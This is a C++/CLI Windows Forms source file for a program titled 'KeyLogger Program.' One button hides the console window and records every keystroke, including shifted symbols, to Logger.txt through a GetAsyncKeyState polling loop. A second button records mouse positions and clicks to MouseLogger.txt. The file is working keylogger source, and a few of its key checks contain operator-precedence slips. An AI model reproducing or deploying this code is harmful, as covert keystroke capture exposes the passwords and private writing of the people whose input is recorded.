#pragma once
#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <conio.h>
#pragma comment(lib, "user32.lib")
namespace TEST {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// Summary for MyForm
	/// </summary>
	public ref class MyForm : public System::Windows::Forms::Form
	{
	public:
		MyForm(void)
		{
			InitializeComponent();
			//
			//TODO: Add the constructor code here
			//
		}

	protected:
		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		~MyForm()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::Label^ label1;
	private: System::Windows::Forms::Button^ button1;

	private: System::Windows::Forms::Label^ label2;
	private: System::Windows::Forms::Button^ button3;

	private: System::Windows::Forms::Label^ label4;
    private: System::Windows::Forms::Label^ label3;

	protected:

	private:
		
		/// <summary>
		/// Required designer variable.
		/// </summary>
		System::ComponentModel::Container^ components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		void InitializeComponent(void)
		{
            this->label1 = (gcnew System::Windows::Forms::Label());
            this->button1 = (gcnew System::Windows::Forms::Button());
            this->label2 = (gcnew System::Windows::Forms::Label());
            this->button3 = (gcnew System::Windows::Forms::Button());
            this->label4 = (gcnew System::Windows::Forms::Label());
            this->label3 = (gcnew System::Windows::Forms::Label());
            this->SuspendLayout();
            // 
            // label1
            // 
            this->label1->AutoSize = true;
            this->label1->BackColor = System::Drawing::SystemColors::ActiveCaption;
            this->label1->Font = (gcnew System::Drawing::Font(L"Monotype Corsiva", 12, static_cast<System::Drawing::FontStyle>((System::Drawing::FontStyle::Bold | System::Drawing::FontStyle::Italic)),
                System::Drawing::GraphicsUnit::Point, static_cast<System::Byte>(0)));
            this->label1->ForeColor = System::Drawing::SystemColors::ActiveCaptionText;
            this->label1->Location = System::Drawing::Point(238, 22);
            this->label1->Margin = System::Windows::Forms::Padding(5, 0, 5, 0);
            this->label1->Name = L"label1";
            this->label1->Size = System::Drawing::Size(254, 28);
            this->label1->TabIndex = 0;
            this->label1->Text = L"Welcome To KeyLogging!";
            this->label1->TextAlign = System::Drawing::ContentAlignment::TopCenter;
            this->label1->Click += gcnew System::EventHandler(this, &MyForm::label1_Click);
            // 
            // button1
            // 
            this->button1->BackColor = System::Drawing::SystemColors::GradientActiveCaption;
            this->button1->Font = (gcnew System::Drawing::Font(L"MV Boli", 13.8F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
                static_cast<System::Byte>(0)));
            this->button1->Location = System::Drawing::Point(167, 68);
            this->button1->Margin = System::Windows::Forms::Padding(5, 6, 5, 6);
            this->button1->Name = L"button1";
            this->button1->Size = System::Drawing::Size(325, 75);
            this->button1->TabIndex = 1;
            this->button1->Text = L"Begin Logging.";
            this->button1->UseVisualStyleBackColor = false;
            this->button1->Click += gcnew System::EventHandler(this, &MyForm::button1_Click);
            // 
            // label2
            // 
            this->label2->AutoSize = true;
            this->label2->BackColor = System::Drawing::SystemColors::ActiveCaption;
            this->label2->Font = (gcnew System::Drawing::Font(L"Monotype Corsiva", 12, static_cast<System::Drawing::FontStyle>((System::Drawing::FontStyle::Bold | System::Drawing::FontStyle::Italic)),
                System::Drawing::GraphicsUnit::Point, static_cast<System::Byte>(0)));
            this->label2->ForeColor = System::Drawing::SystemColors::ActiveCaptionText;
            this->label2->Location = System::Drawing::Point(238, 280);
            this->label2->Margin = System::Windows::Forms::Padding(5, 0, 5, 0);
            this->label2->Name = L"label2";
            this->label2->Size = System::Drawing::Size(279, 28);
            this->label2->TabIndex = 3;
            this->label2->Text = L"Welcome To MouseLogging!";
            // 
            // button3
            // 
            this->button3->BackColor = System::Drawing::SystemColors::GradientActiveCaption;
            this->button3->Font = (gcnew System::Drawing::Font(L"MV Boli", 13.8F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
                static_cast<System::Byte>(0)));
            this->button3->Location = System::Drawing::Point(167, 338);
            this->button3->Margin = System::Windows::Forms::Padding(5, 6, 5, 6);
            this->button3->Name = L"button3";
            this->button3->Size = System::Drawing::Size(325, 80);
            this->button3->TabIndex = 4;
            this->button3->Text = L"Begin Logging.";
            this->button3->UseVisualStyleBackColor = false;
            this->button3->Click += gcnew System::EventHandler(this, &MyForm::button3_Click);
            // 
            // label4
            // 
            this->label4->AutoSize = true;
            this->label4->BackColor = System::Drawing::SystemColors::ButtonFace;
            this->label4->Font = (gcnew System::Drawing::Font(L"Sakkal Majalla", 12, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
                static_cast<System::Byte>(0)));
            this->label4->ForeColor = System::Drawing::SystemColors::MenuHighlight;
            this->label4->Location = System::Drawing::Point(198, 442);
            this->label4->Margin = System::Windows::Forms::Padding(5, 0, 5, 0);
            this->label4->Name = L"label4";
            this->label4->Size = System::Drawing::Size(343, 32);
            this->label4->TabIndex = 6;
            this->label4->Text = L"To Quit Mouse Logging: Please Press ESC.";
            this->label4->Click += gcnew System::EventHandler(this, &MyForm::label4_Click);
            // 
            // label3
            // 
            this->label3->AutoSize = true;
            this->label3->BackColor = System::Drawing::SystemColors::ButtonHighlight;
            this->label3->Font = (gcnew System::Drawing::Font(L"Sakkal Majalla", 12, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
                static_cast<System::Byte>(0)));
            this->label3->ForeColor = System::Drawing::SystemColors::MenuHighlight;
            this->label3->Location = System::Drawing::Point(176, 171);
            this->label3->Name = L"label3";
            this->label3->Size = System::Drawing::Size(422, 32);
            this->label3->TabIndex = 7;
            this->label3->Text = L"To Quit Logging: Please Press Mouse Wheel Button.";
            this->label3->Click += gcnew System::EventHandler(this, &MyForm::label3_Click);
            // 
            // MyForm
            // 
            this->AutoScaleDimensions = System::Drawing::SizeF(17, 36);
            this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
            this->BackColor = System::Drawing::SystemColors::ActiveBorder;
            this->BackgroundImageLayout = System::Windows::Forms::ImageLayout::Center;
            this->ClientSize = System::Drawing::Size(704, 530);
            this->Controls->Add(this->label3);
            this->Controls->Add(this->label4);
            this->Controls->Add(this->button3);
            this->Controls->Add(this->label2);
            this->Controls->Add(this->button1);
            this->Controls->Add(this->label1);
            this->Font = (gcnew System::Drawing::Font(L"Microsoft YaHei", 13.8F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
                static_cast<System::Byte>(0)));
            this->ForeColor = System::Drawing::SystemColors::ActiveCaptionText;
            this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::FixedToolWindow;
            this->Margin = System::Windows::Forms::Padding(5, 6, 5, 6);
            this->Name = L"MyForm";
            this->Text = L"KeyLogger Program.";
            this->Load += gcnew System::EventHandler(this, &MyForm::MyForm_Load);
            this->ResumeLayout(false);
            this->PerformLayout();

        }
#pragma endregion
	private: System::Void label1_Click(System::Object^ sender, System::EventArgs^ e) {
	}
	private: System::Void button1_Click(System::Object^ sender, System::EventArgs^ e) {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        char Key = 'X';
        while (true) {

            Sleep(10);

            if (GetAsyncKeyState(VK_MBUTTON) & 0x8000 != 0) {
                break;

            }
            for (int Key = 8; Key <= 190; Key++) {

                if ((GetAsyncKeyState(Key)) == -32767) {

                    std::fstream LoggerFile;
                    LoggerFile.open("Logger.txt", std::fstream::app);

                    if ((Key > 64 && Key < 91) && !GetAsyncKeyState(0x10)) {
                        Key += 32;
                        LoggerFile << char(Key);
                        LoggerFile.close();
                        
                    }
                    else if (Key > 64 && Key < 91) {
                        LoggerFile << char(Key);
                        LoggerFile.close();
                        
                    }
                    else {

                        if (Key == 48) {
                            if (GetAsyncKeyState(0x10)) {
                                LoggerFile << ")";
                            }
                            else {
                                LoggerFile << "0";
                            }
                            
                        }
                        else if (Key == 49) {
                            if (GetAsyncKeyState(0x10)) {
                                LoggerFile << "!";
                            }
                            else {
                                LoggerFile << "1";
                            }
                            
                        }
                        else if (Key == 50) {
                            if (GetAsyncKeyState(0x10)) {
                                LoggerFile << "@";
                            }
                            else {
                                LoggerFile << "2";
                            }
                            
                        }
                        else if (Key == 51) {
                            if (GetAsyncKeyState(0x10)) {
                                LoggerFile << "#";
                            }
                            else {
                                LoggerFile << "3";
                            }
                            
                        }
                        else if (Key == 52) {
                            if (GetAsyncKeyState(0x10)) {
                                LoggerFile << "$";
                            }
                            else {
                                LoggerFile << "4";
                            }
                            
                        }
                        else if (Key == 53) {
                            if (GetAsyncKeyState(0x10)) {
                                LoggerFile << "%";
                            }
                            else {
                                LoggerFile << "5";
                            }
                            
                        }
                        else if (Key == 54) {
                            if (GetAsyncKeyState(0x10)) {
                                LoggerFile << "^";
                            }
                            else {
                                LoggerFile << "6";
                            }
                            
                        }
                        else if (Key == 55) {
                            if (GetAsyncKeyState(0x10)) {
                                LoggerFile << "&";
                            }
                            else {
                                LoggerFile << "7";
                            }
                            
                        }
                        else if (Key == 56) {
                            if (GetAsyncKeyState(0x10)) {
                                LoggerFile << "*";
                            }
                            else {
                                LoggerFile << "8";
                            }
                            
                        }
                        else if (Key == 57) {
                            if (GetAsyncKeyState(0x10)) {
                                LoggerFile << "(";
                            }
                            else {
                                LoggerFile << "9";
                            }
                            
                        }
                        else if (Key == 96) {
                            LoggerFile << "0";
                            
                        }
                        else if (Key == 97) {
                            LoggerFile << "1";
                            
                        }
                        else if (Key == 98) {
                            LoggerFile << "2";
                            
                        }
                        else if (Key == 99) {
                            LoggerFile << "3";
                            
                        }
                        else if (Key == 100) {
                            LoggerFile << "4";
                            
                        }
                        else if (Key == 101) {
                            LoggerFile << "5";
                            
                        }
                        else if (Key == 102) {
                            LoggerFile << "6";
                            
                        }
                        else if (Key == 103) {
                            LoggerFile << "7";
                            
                        }
                        else if (Key == 104) {
                            LoggerFile << "8";
                            
                        }
                        else if (Key == 105) {
                            LoggerFile << "9";
                            
                        }
                        else if (Key == VK_ESCAPE) {
                            LoggerFile << "[ESCAPE]";
                            
                        }
                        else if (Key == 160 || Key == 161) {
                            LoggerFile << "";
                            
                        }
                        else if (Key == 20) {
                            LoggerFile << "[CAPS LOCK]";
                            
                        }
                        else if (Key == 13) {
                            LoggerFile << "[Enter]";
                            
                        }
                        else if (Key == VK_SPACE) {
                            LoggerFile << "[SPACE]";
                            
                        }
                        else if (Key == VK_SHIFT) {
                            LoggerFile << "[SHIFT]";
                            
                        }
                        else if (Key == 8) {
                            LoggerFile << "[BACKSPACE]";
                            
                        }
                        else if (Key == 9) {
                            LoggerFile << "[HORIZNTAL TAB]";
                            
                        }
                        else if (Key == 127) {
                            LoggerFile << "[DELETE]";
                            
                        }
                        else if (Key == VK_CONTROL) {
                            LoggerFile << "[CTRL]";
                            
                        }
                        else if (Key == 24) {
                            LoggerFile << "[CANCEL]";
                            
                        }
                        else if (Key == VK_UP) {
                            LoggerFile << "[UP]";
                            
                        }
                        else if (Key == VK_DOWN) {
                            LoggerFile << "[DOWN]";
                            
                        }
                        else if (Key == VK_RIGHT) {
                            LoggerFile << "[RIGHT]";
                            
                        }
                        else if (Key == VK_LEFT) {
                            LoggerFile << "[LEFT]";
                            
                        }
                        else if (Key == VK_OEM_1) {
                        if (GetAsyncKeyState(0x10)) {
                            LoggerFile << ":";
                        }
                        else {
                            LoggerFile << ";";
                        }
                        }
                        

                        else {
                            LoggerFile << Key;
                        }

                    }
                }
            }
            
        }
	}
	private: System::Void button3_Click(System::Object^ sender, System::EventArgs^ e) {
		//ShowWindow(GetConsoleWindow(), SW_HIDE);
		while (1) {
			Sleep(1000);
				int x, y;
				POINT obj;

				std::fstream MouseLogger;
				MouseLogger.open("MouseLogger.txt", std::fstream::app);

				GetCursorPos(&obj);
                MouseLogger << "Position X:" << obj.x << "\t Position Y:" << obj.y << std::endl;

				if (GetAsyncKeyState(VK_LBUTTON) & 0x8000 != 0) {
                    MouseLogger << "Left Click" << std::endl;

				}

				if (GetAsyncKeyState(VK_RBUTTON) & 0x8000 != 0) {
                    MouseLogger << "Right Click" << std::endl;

				}if (GetAsyncKeyState(VK_MBUTTON) & 0x8000 != 0) {
                    MouseLogger << "Wheel Click" << std::endl;

				} if (GetAsyncKeyState(VK_ESCAPE) & 0x8000 != 0) {
					break;

				}

			
		}
		
	}
	private: System::Void MyForm_Load(System::Object^ sender, System::EventArgs^ e) {
	}
	private: System::Void label4_Click(System::Object^ sender, System::EventArgs^ e) {
	}
private: System::Void label3_Click(System::Object^ sender, System::EventArgs^ e) {
}
};
}